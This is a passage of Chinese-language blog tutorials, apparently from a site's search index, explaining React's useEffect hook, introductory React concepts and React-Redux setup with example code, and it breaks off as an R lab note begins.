<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useEffect &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Welcome</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">&#x27;加载完成&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-基本用法——第二个参数"><a href="#2-基本用法——第二个参数" class="headerlink" title="2. 基本用法——第二个参数"></a>2. 基本用法——第二个参数</h3><p>但是，有些时候，我们不希望 useEffect() 每次渲染都执行，这时候可以使用它的第二个参数。useEffect() 的第二参数是一个数组类型的参数，它可以用于指定副效应函数的<strong>依赖项</strong>，<strong>只有当依赖项发生变化时，组件才会重新渲染</strong>。</p>
<p>示例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Welcome</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`Hello, <span class="subst">$&#123;props.name&#125;</span>`</span>;</span><br><span class="line">  &#125;, [props.name]);</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，<strong>如果第二个参数是一个空数组</strong>，就表明副效应函数<strong>没有任何依赖项</strong>。因此，副效应函数<strong>只会在组件加载到DOM后执行一次</strong>，此后即使组件重新渲染，也不再执行。</p>
<h2 id="六、useEffect-的用途"><a href="#六、useEffect-的用途" class="headerlink" title="六、useEffect() 的用途"></a>六、useEffect() 的用途</h2><p>只要是副效应，都可以使用 useEffect() 来引入。它的常见用途有如下几种：</p>
<ul>
<li>获取数据（data fetching）</li>
<li>事件监听或订阅（setting up a subscription）</li>
<li>改变 DOM（changing the DOM）</li>
<li>输出日志（logging）</li>
</ul>
<p>示例如下（从远程服务器获取数据）：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = useState(&#123; <span class="attr">hits</span>: [] &#125;);</span><br><span class="line">  </span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> fetchData = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="keyword">await</span> axios(</span><br><span class="line">        <span class="string">&#x27;https://getdataAPI/?id=1&#x27;</span>,</span><br><span class="line">      );</span><br><span class="line">      </span><br><span class="line">      setData(result.data);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    fetchData();</span><br><span class="line">  &#125;, []);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;data.hits.map(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        &lt;li key = &#123;item.id&#125;&gt;</span><br><span class="line">          &lt;a href=&#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">      &#125;)&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure>
<p>在该示例中，useState() 用来生成一个状态变量和设置状态变量的方法以保存/更新获取的数据。useEffecr() 的副效应函数内部有一个异步函数 async 函数，用来从服务器异步获取数据，等拿到数据以后，再用 setData() 更新状态以出发组件重新渲染。</p>
<p>注意：此处的第二个参数为一个空数组，因为在该示例中只需获取数据一次即可。</p>
<h2 id="七、useEffect-的返回值"><a href="#七、useEffect-的返回值" class="headerlink" title="七、useEffect() 的返回值"></a>七、useEffect() 的返回值</h2><p>副效应是随着组件加载而产生的，那么当组件卸载时，有时也需要清理这些副效应。</p>
<p>useEffect() <strong>允许返回一个函数</strong>，<strong>在组件卸载时会执行该函数</strong>，<strong>清理副效应</strong>（实际上，由于副效应函数在组件每次渲染时都会执行，因此清理副效应不仅会发生在组件卸载时，而且每次副效应执行前，都会执行一次来清理上一次渲染的副效应）。如果不需要清理副效应，那么 useEffect() 不用返回任何值。</p>
<p>例如，副效应为组件加载时订阅一个事件，那么在组件卸载时，我们需要取消订阅，因此我们需要清理这个副效应。示例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">useEffect(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> subscription = props.source.subscribe();</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    subscription.unsubscribe();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, [props.source]);</span><br></pre></td></tr></table></figure>
<h2 id="八、useEffect-的注意点"><a href="#八、useEffect-的注意点" class="headerlink" title="八、useEffect() 的注意点"></a>八、useEffect() 的注意点</h2><p>使用 useEffect() 时，<strong>如果有多个副效应</strong>，**应该调用多个 useEffect()**，而不是合并写成一个。</p>
<p><strong>Notes：</strong>以上内容借鉴自阮一峰老师的博客。</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>React入门篇</title>
    <url>/2022/02/12/ReactIntroduction/</url>
    <content><![CDATA[<p>前端热门技术栈有很多，其中遵循/类似MVVM或MVC设计模式的前端框架/Library有：React、Vue以及Angular等等。今天，我们首先谈一谈React的基本概念。</p>
<a id="more"></a>

<h1 id="React-入门"><a href="#React-入门" class="headerlink" title="React 入门"></a>React 入门</h1><h2 id="一、如果ReactJS在HTML中"><a href="#一、如果ReactJS在HTML中" class="headerlink" title="一、如果ReactJS在HTML中"></a>一、如果ReactJS在HTML中</h2><p>如果React的代码要写在HTML中，则需要放在属性<code>type</code>为<code>text/babel</code>的<code>&lt;script&gt;</code>标签中。因为React使用的是<strong>JSX语法</strong>，与JS不兼容，需要被转化为JS语法才能显示在Web页面上。示例代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../build/react.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../build/react-dom.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../build/browser.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/babel&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// ** JSX code **</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此外，有三个必须的库需要首先加载。<code>react.js</code>是<strong>React的核心库</strong>。<code>react-dom.js</code>是<strong>提供与DOM相关的功能</strong>，例如将元素插入DOM节点。<code>Browser.js</code>是将JSX语法转换为JS语法，这一步很耗时，实际项目中会在服务端完成它。</p>
<h2 id="二、ReactDOM-render"><a href="#二、ReactDOM-render" class="headerlink" title="二、ReactDOM.render()"></a>二、ReactDOM.render()</h2><p>它是React中最基础的方法，用于将JSX代码转换为HTML代码，并将其插入到指定的DOM节点。示例代码如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;div&gt;...&lt;/div&gt;,</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="三、JSX语法"><a href="#三、JSX语法" class="headerlink" title="三、JSX语法"></a>三、JSX语法</h2><p>就像上面代码演示的那样，HTML代码和JS代码并存在同一代码中，这就是JSX语法。它允许JS与HTML混写。其<strong>原理在于JSX语法：</strong>当遇到HTML标签（即<code>&lt;&gt;</code>）时会自动识别HTML，并按HTML规则解析；当遇到JS代码块（即<code>&#123;&#125;</code>）时会自动识别JS，并按JS规则解析。</p>
<p>具体syntax语法学习，请参考官方文档。</p>
<h2 id="四、组件"><a href="#四、组件" class="headerlink" title="四、组件"></a>四、组件</h2><p>React允许将代码块封装成组件 <strong>component</strong>，然后像插入HTML标签一样，将其插入到DOM节点。示例代码如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> HelloMsg = React.createClass(&#123;</span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;HelloMsg name=<span class="string">&quot;Word!&quot;</span> /&gt;,</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="五、如何获取真实DOM节点"><a href="#五、如何获取真实DOM节点" class="headerlink" title="五、如何获取真实DOM节点"></a>五、如何获取真实DOM节点</h2><p>尽管操作组件类似于操作HTML标签，但是<strong>组件并非真实的DOM节点</strong>，而<strong>是存在于内存中的一种数据结构</strong>，称为<strong>虚拟DOM即 Virtual DOM</strong>。因此，只有在它被插入到文档/Document之后，才能生效成为真实的DOM。</p>
<p>这主要是因为React设计的<strong>DOM diffing算法</strong>，大致思想为：所有的DOM操作，会先在虚拟DOM上执行，然后再通过比对虚拟DOM和真实DOM，将真正发生改变的部分在真实DOM中更新。这样的做法大大地提高了网页的性能。</p>
<p>但是，有时我们也需要在组件中获取真实DOM，React给我们提供了**<code>ref</code>属性**。例如：在类组件中，可以调用<code>this.refs.[refName]</code>来获取真实的DOM节点。示例代码如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> MyComponent = React.createClass(&#123;</span><br><span class="line">  handleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.refs.myTextInput.focus();</span><br><span class="line">  &#125;,</span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> ref=<span class="string">&quot;myTextInput&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;Focus the text input&quot;</span> onClick=&#123;<span class="built_in">this</span>.handleClick&#125; /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;MyComponent /&gt;,</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="六、State——组件状态机"><a href="#六、State——组件状态机" class="headerlink" title="六、State——组件状态机"></a>六、State——组件状态机</h2><p>组件是有状态的，React的一大创新就是：将组件看成一个状态机，一开始有一个初始状态，然后通过与用户的交互，导致状态更新，进而触发组件重新渲染。这就实现了<strong>由状态驱动的理念</strong>和<strong>单向数据流的特点</strong>即数据只能在状态中改变然后影响组件其它部分。</p>
<p>表单数据也是属于用户与组件的交互，因此也需要借助状态来读取和更新。示例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Input = React.createClass(&#123;</span><br><span class="line">  getInitialState: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">value</span>: <span class="string">&#x27;Hello!&#x27;</span>&#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  handleChange: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.setState(&#123;<span class="attr">value</span>: event.target.value&#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  render: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value = <span class="built_in">this</span>.state.value;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> value=&#123;value&#125; onChange=&#123;<span class="built_in">this</span>.handleChange&#125; /&gt;</span><br><span class="line">        &lt;p&gt;&#123;value&#125;&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">Input</span>/&gt;</span></span>, <span class="built_in">document</span>.body);</span><br></pre></td></tr></table></figure>
<p><strong>注：在React中，只有state/状态数据是可以改变的，而其它的如props/属性是不可变的。</strong></p>
<h2 id="七、类组件的生命周期"><a href="#七、类组件的生命周期" class="headerlink" title="七、类组件的生命周期"></a>七、类组件的生命周期</h2><p>组件生命周期主要可以分为三个状态：</p>
<blockquote>
<ul>
<li>Mounting/挂载：已插入真实DOM</li>
<li>Updating/更新：正在被重新渲染</li>
<li>Unmounting/卸载：已移除真实DOM</li>
</ul>
</blockquote>
<p>并且React为每个状态提供了两种处理函数，**<code>will</code>函数（在进入状态前调用）和<code>did</code>函数（在进入状态后调用）**。主要使用的5个处理函数如下：</p>
<blockquote>
<ul>
<li>componentWillMount()</li>
<li>componentDidMount()</li>
<li>componentWillUpdate(object nextProps, object nextState)</li>
<li>componentDidUpdate(object prevProps, object prevState)</li>
<li>componentWillUnmount()</li>
</ul>
</blockquote>
<p>同时React还提供了一些特殊的状态的处理函数，例如<code>shouldComponentUpdate(object nextProps, object nextState)</code>在组件判断是否重新渲染时调用。</p>
<p><strong>注：由于React官方正在逐步废弃Class组件，很多的处理函数已经不被官方推荐使用，因此，我们不多赘述Class组件。随着React官方对Hook的重视，我们在接下来的文章会重点介绍Hook的概念和使用。</strong></p>
<h2 id="一些不常用的功能"><a href="#一些不常用的功能" class="headerlink" title="一些不常用的功能"></a>一些不常用的功能</h2><h3 id="PropTypes"><a href="#PropTypes" class="headerlink" title="PropTypes"></a>PropTypes</h3><p>尽管组件可以接受任意类型的值来作为它的属性，但是有时，我们<strong>需要组件只接受特定的类型作为它的属性</strong>。<code>PropTypes</code>可以帮助我们验证组件实例的属性是否符合要求。</p>
<p>具体用法如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> MyTitle = React.createClass(&#123;</span><br><span class="line">  propTypes: &#123;</span><br><span class="line">    title: React.PropTypes.string.isRequired, <span class="comment">// title属性是必须的，且需为字符串</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> &#123;this.props.title&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>此外，<code>getDefaultProps</code>方法可以用来设置组件属性的默认值。具体用法如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> MyTitle = React.createClass(&#123;</span><br><span class="line">  getDefaultProps : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title : <span class="string">&#x27;Hello World&#x27;</span>	   <span class="comment">// 设置属性title的默认值为Hello World</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> &#123;this.props.title&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;MyTitle /&gt;,</span><br><span class="line">  <span class="built_in">document</span>.body</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


























]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>Redux入门操作详解</title>
    <url>/2021/11/28/ReduxIntroduction/</url>
    <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
<a id="more"></a>

<h1 id="React-Redux"><a href="#React-Redux" class="headerlink" title="React-Redux"></a>React-Redux</h1><p><strong>首先，react-redux与redux的核心理念一致，只是一些API的使用上存在差异，react-redux使得在react中使用redux更为简便。</strong></p>
<h2 id="Redux的三大原则——Three-Principles"><a href="#Redux的三大原则——Three-Principles" class="headerlink" title="Redux的三大原则——Three Principles"></a>Redux的三大原则——Three Principles</h2><h3 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h3><p>整个应用的<code>state</code>被存储在一棵object tree上，并且这个object tree只存在于<code>store</code>，且<code>store</code>是唯一的，仅此一个。</p>
<h3 id="State只读"><a href="#State只读" class="headerlink" title="State只读"></a>State只读</h3><p>唯一改变state的方法是触发<strong>action</strong>，action是一个用于描述已发生事件的对象，其形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code></p>
<h3 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h3><p><strong>为了描述action如何改变state tree，需要编写reducers。</strong></p>
<p>Reducer只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。</p>
<h2 id="React-Redux实际操作步骤"><a href="#React-Redux实际操作步骤" class="headerlink" title="React-Redux实际操作步骤"></a>React-Redux实际操作步骤</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在src下新建名为<code>redux</code>的文件，并创建好4个common JS文件，分别为<code>store.js</code>, <code>reducer.js</code>, <code>action.js</code>以及<code>constant.js</code>。其中<code>constant.js</code>用于存储常量，其余三个代表redux的三个核心。</p>
<p>注：如果不只一个<code>action/reducer</code>，可以分别创建action和reducer的文件夹。</p>
<p>在<code>index.js</code>中引入<code>store.js</code>，并从<code>react-redux</code>中引入<code>Provider</code>，<code>Provider</code>组件用于给<code>App</code>下的每个需要用到redux的组件传递<code>store</code>。实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./redux/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    <span class="comment">//为所有组件提供store</span></span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App /&gt;</span><br><span class="line">    &lt;/Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>));</span><br></pre></td></tr></table></figure>


<h3 id="步骤二——编写store"><a href="#步骤二——编写store" class="headerlink" title="步骤二——编写store"></a>步骤二——编写store</h3><p>在store文件中引入能创建<code>store</code>实例的<code>creatStore</code>、能修改状态的<code>reducer</code>和能执行异步的<code>thunk</code>和中间件<code>applyMiddleware</code>（如果需要）。</p>
<p>注：<strong>对于多个状态需要维护的情况，从<code>redux</code>中引入<code>combineReducers</code>方法，该方法可以通过对象<code>&#123;&#125;</code>的键值对<code>key:value</code>形式，维护任意多个状态（即reducer）。</strong></p>
<p>实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware, combineReducers&#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> countReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/count&#x27;</span></span><br><span class="line"><span class="keyword">import</span> personReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/person&#x27;</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">&#x27;redux-thunk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> allReducers = combineReducers(&#123;<span class="attr">count</span>: countReducer, <span class="attr">people</span>: personReducer&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(allReducers, applyMiddleware(thunk))</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>
<h3 id="步骤三——编写action"><a href="#步骤三——编写action" class="headerlink" title="步骤三——编写action"></a>步骤三——编写action</h3><p>引入store文件，和常量文件constant（如果有）。编写action函数，其会返回一个action对象，形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code>。</p>
<p>实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;INCREMENT, DECREMENT&#125; <span class="keyword">from</span> <span class="string">&#x27;../constant&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:INCREMENT, data&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createDecrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:DECREMENT, data&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAsyncAction = <span class="function">(<span class="params">data, time</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            store.dispatch(&#123;<span class="attr">type</span>:INCREMENT, data&#125;)</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="步骤四——编写reducer"><a href="#步骤四——编写reducer" class="headerlink" title="步骤四——编写reducer"></a>步骤四——编写reducer</h3><p><strong>reducer负责维护状态。</strong>编写reducer函数，需要设置初始化的状态值，并对函数传入<code>action</code>参数，根据<code>action</code>对象的<code>type</code>和<code>data</code>对状态进行操作，并返回操作后的状态。</p>
<p>实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">countReducer</span>(<span class="params">preState=initNumber, action</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;type, data&#125; = action;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;increment&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState + data;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;decrement&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState - data;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> preState;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>至此，redux部分的基本三大件已经写完。接下来需要编写组建模块。</p>
<h3 id="步骤五——编写Container-Component"><a href="#步骤五——编写Container-Component" class="headerlink" title="步骤五——编写Container/Component"></a>步骤五——编写Container/Component</h3><p>首先，引入<code>action</code>，并从<code>react-redux</code>中引入<code>connect</code>函数，该函数用于创建并暴露一个Container容器，同时将state和action传入组件中，并且它们都会被传入到组件自身的<code>prorps</code>属性中。实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">// 引入connect</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"><span class="comment">// 引入action</span></span><br><span class="line"><span class="keyword">import</span> &#123;createIncrementAction, createDecrementAction, createIncrementAsyncAction&#125; <span class="keyword">from</span> <span class="string">&#x27;../../redux/actions/count&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Count</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  	<span class="comment">// 传入state</span></span><br><span class="line">    state =&gt; (&#123;<span class="attr">count</span>: state.count, <span class="attr">people</span>: state.people&#125;),</span><br><span class="line">  	<span class="comment">// 传入action</span></span><br><span class="line">    &#123;<span class="attr">increment</span>: createIncrementAction,</span><br><span class="line">     decrement: createDecrementAction,</span><br><span class="line">     asyncIncrement: createIncrementAsyncAction</span><br><span class="line">    &#125;</span><br><span class="line">    )(Count)</span><br></pre></td></tr></table></figure>
































]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>R-NoteBook</title>
    <url>/2021/02/16/Rnotebook/</url>
    <content><![CDATA[<h1 id="R-Lab1-Note"><a href="#R-Lab1-Note" class="headerlink" title="R Lab1 Note"></a>R Lab1 Note</h1><a id="more"></a>

<h3 id="1-Basic-Operations"><a href="#1-Basic-Operations" class="headerlink" title="1   Basic Operations"></a>1   Basic Operations</h3><h4 id="Arithmetic-Operations"><a href="#Arithmetic-Operations" class="headerlink" title="Arithmetic Operations"></a>Arithmetic Operations</h4><ol>
<li><p>Define variable</p>
